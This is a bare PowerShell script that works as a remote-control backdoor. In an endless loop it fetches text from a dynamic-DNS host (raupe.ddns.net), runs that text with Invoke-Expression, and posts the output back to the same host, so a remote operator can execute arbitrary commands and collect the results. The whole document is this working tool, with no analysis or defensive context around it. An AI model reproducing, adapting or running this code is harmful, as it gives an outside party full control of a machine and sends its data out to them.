$url = 'raupe.ddns.net/cdr'
$lastOutput = ''
$ErrorActionPreference = 'Stop'

while ($true) {
    Write-Host "Sending GET request to $url"
    try {
        $response = Invoke-WebRequest -Uri $url -Method Get -TimeoutSec 20
        $receivedData = $response.Content
    } catch {
        Write-Host "Error sending GET request: $($_.Exception.Message)"
        Start-Sleep -Seconds 10
        continue
    }

    if ([string]::IsNullOrWhiteSpace($receivedData)) {
        Write-Host 'No response received. Waiting...'
        Start-Sleep -Seconds 10
    } elseif ($receivedData -eq $lastOutput) {
        Write-Host 'Received data is the same as last output. Waiting...'
        Start-Sleep -Seconds 10
    } else {
        try {
            Write-Host "Executing $receivedData as an expression"
            try {
                $out = Invoke-Expression $receivedData 2>&1 | Out-String
                if ([string]::IsNullOrWhiteSpace($out)) {
                    $out = "$receivedData executed"
                }
                Write-Host "Output from expression: $out"
            } catch {
                $errorMessage = $_.Exception.Message
                Write-Host "Error executing expression: $errorMessage"
                $out = $errorMessage
            }

            Start-Sleep -Seconds 1
            $headers = @{
                'Content-Type' = 'text/plain'
                'Content-Length' = [System.Text.Encoding]::UTF8.GetByteCount($out)
            }

            $lastOutput = $out
            $postSuccess = $false
            $postAttempts = 0

            while (-not $postSuccess -and $postAttempts -lt 3) {
                try {
                    Write-Host "Sending POST request with content length $($headers['Content-Length'])"
                    Invoke-WebRequest -Uri $url -Method Post -Body $out -Headers $headers -TimeoutSec 20
                    $postSuccess = $true
                    Write-Host 'POST request succeeded'
                    $out = ''
                } catch {
                    $errorMessage = $_.Exception.Message
                    Write-Host "Error sending POST request: $errorMessage"
                    Start-Sleep -Seconds 5
                    $postAttempts++
                }
            }

            if (-not $postSuccess) {
                Write-Host 'Failed to send POST request after 3 attempts. Continuing...'
            }
        } catch {
            $errorMessage = $_.Exception.Message
            Write-Host "Error executing expression: $errorMessage"
        }
    }

    Write-Host "Looping again..."
}
